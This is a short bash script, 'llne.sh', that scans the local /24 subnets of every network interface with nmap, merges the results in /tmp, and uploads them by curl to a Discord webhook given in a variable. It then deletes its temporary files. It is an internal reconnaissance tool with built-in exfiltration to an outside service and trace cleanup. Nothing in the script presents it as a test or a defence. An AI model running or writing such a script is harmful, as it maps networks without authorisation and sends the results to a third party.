#!/usr/bin/env bash

# llne.sh

# config
if [[ $dc == "" ]]
then
    echo "No discord webhook url provided"
    exit 1
fi

if [[ "$(which nmap)" = "nmap not found" ]]
then
    HAVE_NMAP=0
else
    HAVE_NMAP=1
fi

if [[ $(whoami) != "root" ]]
then
    HAVE_ROOT=0
else
    HAVE_ROOT=1
fi

scan_network () {

    ret_list=()
    if [[ $HAVE_NMAP -eq 1 ]]
    then
        if [[ $HAVE_ROOT -eq 1 ]]
        then
            nmap -sS $1/24 -T4 -oN /tmp/llne_$1.txt
        else
            nmap -sT $1/24 -T4 -oN /tmp/llne_$1.txt
        fi
    else
        echo "nmap not found"
    fi

    #echo ${ret_list[@]}
}




ips=$(ip a | grep inet | cut -d "/" -f1 | awk '{print $2}' | grep -v 127.0.0.1)

for IP in $ips; do
    
    # go over all ips within networks where IP belong to, and check if they are up
    scan_network $IP

done

for f in $(find /tmp/ -name "llne_*" -type f 2>/dev/null); do
    cat $f >> /tmp/llne_results.txt
done

if [[ $(du -b /tmp/llne_results.txt | cut -f1) -gt 50000 ]]
then
    split -b50000  /tmp/llne_results.txt /tmp/llne_results.txt.
    for f in $(find /tmp/ -name "llne_results.txt.*" -type f 2>/dev/null); do
        curl -X POST -H "Content-Type: multipart/form-data"  -F "file=@$f" $dc
    done
else
    curl -X POST -H "Content-Type: multipart/form-data"  -F "file=@/tmp/llne_results.txt" $dc
fi

rm -rf /tmp/llne*